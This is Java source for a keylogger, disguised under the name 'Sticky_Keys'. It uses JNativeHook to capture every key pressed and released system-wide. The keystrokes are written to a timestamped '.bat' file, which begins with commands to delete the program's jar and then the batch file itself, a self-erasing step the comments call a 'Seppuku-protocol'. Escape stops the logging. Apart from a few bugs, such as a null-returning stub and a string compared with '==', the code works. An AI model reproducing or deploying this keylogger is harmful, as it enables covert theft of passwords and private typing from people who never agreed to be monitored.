
// Sticky_Keys

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintStream;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Sticky_Keys implements NativeKeyListener{
	public static void main (String [] args) throws FileNotFoundException{
		
		//Get the Current Time and date (2018/12/02-20:23:34). 
		Date date = new Date();
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd~HH-mm-ss");  //Note: in Windows one can't use ":" when creating a file.
		String TimeAndDateNow = formatter.format(date);
		
		//String fileNameSK = TimeAndDateNow + "_Sticky_Keys.bat";
		String fileNameSK = TimeAndDateNow + "_Sticky_Key_Protocol.bat";
		
		// Creating a File object that represents the disk file. 
        PrintStream SK = new PrintStream(new File(fileNameSK)); 
        
        // Assign o to output stream 
        System.setOut(SK); 
        System.out.println("del Sticky_Key_Protocol.jar");
        System.out.println("del %0");  // This command will execute a Seppuku-protocol when the .bat file is launched.
		
        
        
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		GlobalScreen();
		org.jnativehook.GlobalScreen.addNativeKeyListener(new Sticky_Keys());
		
		//Key_of_Death kodObject = new Key_of_Death();
		//kodObject.KOD(fileNameSK);
		
	}

	private static GlobalScreen GlobalScreen() {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub 
		System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
		
//Key of Death 	
// When this key is pressed it will stop the program!		
//-----------------------------------------------------------------------------------------------------		
		String Key_Released = NativeKeyEvent.getKeyText(e.getKeyCode());
		//Released: Escape
		if ( Key_Released == "Escape" ) {
			 System.exit(0);
		}
//-----------------------------------------------------------------------------------------------------		
		
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//System.out.println("Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
		
		
	}

	

}
